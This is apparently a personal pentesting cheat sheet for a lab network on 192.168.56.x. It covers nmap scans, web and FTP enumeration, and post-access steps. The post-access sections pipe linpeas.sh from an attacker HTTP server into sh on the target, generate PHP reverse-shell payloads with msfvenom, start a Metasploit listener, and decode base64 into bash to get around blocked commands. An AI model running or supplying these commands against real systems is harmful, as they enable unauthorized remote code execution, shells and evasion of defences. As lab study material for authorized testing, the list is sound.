# Guide

# Scan

    nmap -sV 192.168.56.107/24
    sudo nmap -v --script vuln  192.168.56.108

Run nmap and find open ports  
No ports open? Try nmap with -Pn

## Windows
https://book.hacktricks.xyz/windows-hardening/basic-cmd-for-pentesters

# HTTP

Run gobuster, nikto, dirb

Look for
- robots.txt
- backup files
- configuration files

- View source
- Inputs
  - Injection
    - SQL
    - Command
  - Default user
  - Brute force with ffuf
- URL Parameters 
  - Injection
      - SQL
      - Command
  - Fuzzer

# FTP

    ftp <ip>

# Gained access
## Linux
https://book.hacktricks.xyz/linux-hardening/useful-linux-commands

### Serve file remotely

On attacker machine, go where your script is and start a http server

    cd ~/privesc/linux && python3 -m http.server

On target machine

    curl -L http://192.168.56.107:8000/linpeas.sh | sh
    wget -q -O - http://192.168.56.107:8000/linpeas.sh | sh

### Useful Software
https://book.hacktricks.xyz/linux-hardening/privilege-escalation

    which nmap aws awk nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null

Find commands with sudo permissions

    sudo -l

## Compile C

   gcc -Wall -o compiled-output source.c -lpthread



## Reverse shells

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet.md

metasploit

    use exploit/multi/handler

### PHP

    msfvenom -p php/reverse_php LHOST=192.168.56.107 LPORT=4443
    msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.56.107 LPORT=4443

# Troubleshoot

## Command blocked

- Try to encode it with base64
   "base64Code" | base64 -d | bash